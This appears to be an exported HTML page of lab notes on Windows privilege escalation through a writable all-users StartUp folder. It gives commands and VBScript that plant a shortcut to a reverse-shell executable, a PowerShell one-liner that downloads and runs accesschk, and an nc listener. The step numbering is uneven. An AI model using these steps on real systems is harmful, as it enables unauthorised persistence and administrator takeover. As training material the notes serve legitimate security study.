<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>7. Startup Apps</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>7. Startup Apps</h1><br /><br /><strong>
      <h3>Startup Apps</h3>
    </strong><br />• Each user can define apps that start when they log in, by placing shortcuts to them in a specific
    directory.<br />• Windows also has a startup directory for apps that should start for all users:<br />
    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br />• If we can create files in this directory, we can
    use our reverse shell executable and escalate privileges when an admin logs in.<br /><br /><br /><br />1. Use
    accesschk.exe to check permissions on the StartUp directory:<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-d&nbsp;&#39;C:\ProgramData\Microsoft\Windows\Start&nbsp;Menu\Programs\StartUp&#39;&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1336-1.png" alt="images/1336-1.png" /></a><br /> The BUILTIN Users group
    has write access to &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\&quot; directory so we can
    add a startup app which will start whenever any user logs in <br /><br />2. Startups in
    &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\&quot; must be shortcuts, also known as link
    files(.lnk)<br />3. Create a file CreateShortcut.vbs with the following VBScript. Change the oLink.TargetPath
    variable path<br />
    <div class="codebox">
      <div class="codebox">
        Set&nbsp;oWS&nbsp;=&nbsp;WScript.CreateObject(&quot;WScript.Shell&quot;)<br />sLinkFile&nbsp;=&nbsp;&quot;C:\ProgramData\Microsoft\Windows\Start&nbsp;Menu\Programs\StartUp\reverse.lnk&quot;<br />Set&nbsp;oLink&nbsp;=&nbsp;oWS.CreateShortcut(sLinkFile)<br />oLink.TargetPath&nbsp;=&nbsp;&quot;C:\PrivEsc\reverse.exe&quot;<br />oLink.Save
      </div>
    </div><br /> We can copy paste all the following code to create the CreateShortcut.vbs file<br />
    <div class="codebox">
      <div class="codebox">
        echo&nbsp;Set&nbsp;oWS&nbsp;=&nbsp;WScript.CreateObject(&quot;WScript.Shell&quot;)&nbsp;&gt;&nbsp;CreateShortcut.vbs<br />echo&nbsp;sLinkFile&nbsp;=&nbsp;&quot;C:\ProgramData\Microsoft\Windows\Start&nbsp;Menu\Programs\StartUp\reverse.lnk&quot;&nbsp;&gt;&gt;&nbsp;CreateShortcut.vbs<br />echo&nbsp;Set&nbsp;oLink&nbsp;=&nbsp;oWS.CreateShortcut(sLinkFile)&nbsp;&gt;&gt;&nbsp;CreateShortcut.vbs<br />echo&nbsp;oLink.TargetPath&nbsp;=&nbsp;&quot;C:\PrivEsc\reverse.exe&quot;&nbsp;&gt;&gt;&nbsp;CreateShortcut.vbs<br />echo&nbsp;oLink.Save&nbsp;&gt;&gt;&nbsp;CreateShortcut.vbs
      </div>
    </div><br /> veryfy that the file is been created<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;type&nbsp;CreateShortcut.vbs</div>
    </div><br /> <a href=""><img src="images/1336-2.png" alt="images/1336-2.png" /></a><br />5. Run the script using
    cscript:<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;cscript&nbsp;CreateShortcut.vbs</div>
    </div><br /><br />5. Start a listener on Kali<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div><br />7. When the administrator user will login on the target Windows, he will trigger automatically the
    exploit.<br /> <a href=""><img src="images/1336-3.png" alt="images/1336-3.png" /></a>
  </div>
</body>

</html>